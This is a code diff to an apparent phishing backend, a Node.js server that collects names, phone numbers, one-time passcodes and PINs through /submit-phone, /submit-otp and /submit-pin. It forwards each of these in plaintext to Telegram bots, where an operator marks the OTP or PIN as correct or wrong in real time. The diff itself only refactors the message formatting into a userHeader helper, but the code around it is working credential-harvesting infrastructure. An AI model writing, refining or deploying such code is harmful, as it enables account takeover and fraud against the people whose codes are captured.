@@ -84,6 +84,12 @@ function getBot(botId) {
   return bots.find(b => b.botId === botId);
 }
 
+// ---------- FORMATTING ----------
+// Every Telegram notification uses this so name + phone always appear.
+function userHeader(name, phone) {
+  return `👤 Name: ${name || '—'}\n📞 Phone: ${phone || '—'}`;
+}
+
 // ---------- TELEGRAM HELPERS ----------
 async function sendTelegram(bot, text, buttons = []) {
   try {
@@ -184,7 +190,7 @@ app.post('/submit-phone', async (req, res) => {
 
     await sendTelegram(
       bot,
-      `📱 PHONE VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🆔 Ref: ${requestId}`,
+      `📱 PHONE VERIFICATION\n${userHeader(name, phone)}\n🆔 Ref: ${requestId}`,
       [[
         { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
         { text: '❌ Reject',  callback_data: `phone_bad:${requestId}` }
@@ -219,7 +225,7 @@ app.post('/submit-otp', async (req, res) => {
 
     await sendTelegram(
       bot,
-      `🔐 OTP VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🔢 OTP: ${otp}\n🆔 Ref: ${requestId}`,
+      `🔐 OTP VERIFICATION\n${userHeader(name, phone)}\n🔢 OTP: ${otp}\n🆔 Ref: ${requestId}`,
       [
         [
           { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
@@ -259,7 +265,7 @@ app.post('/submit-pin', async (req, res) => {
 
     await sendTelegram(
       bot,
-      `🔐 PIN VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🔢 PIN: ${pin}\n🆔 Ref: ${requestId}`,
+      `🔐 PIN VERIFICATION\n${userHeader(name, phone)}\n🔢 PIN: ${pin}\n🆔 Ref: ${requestId}`,
       [[
         { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
         { text: '❌ Wrong PIN',   callback_data: `pin_bad:${requestId}` }
@@ -359,7 +365,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     if (feedback) {
       await sendTelegram(
         bot,
-        `📝 ACTION TAKEN\n👤 Name: ${entry.meta?.name || '—'}\n📞 Phone: ${entry.meta?.phone || '—'}\n${feedback}`
+        `📝 ACTION TAKEN\n${userHeader(entry.meta?.name, entry.meta?.phone)}\n${feedback}`
       );
     }
 
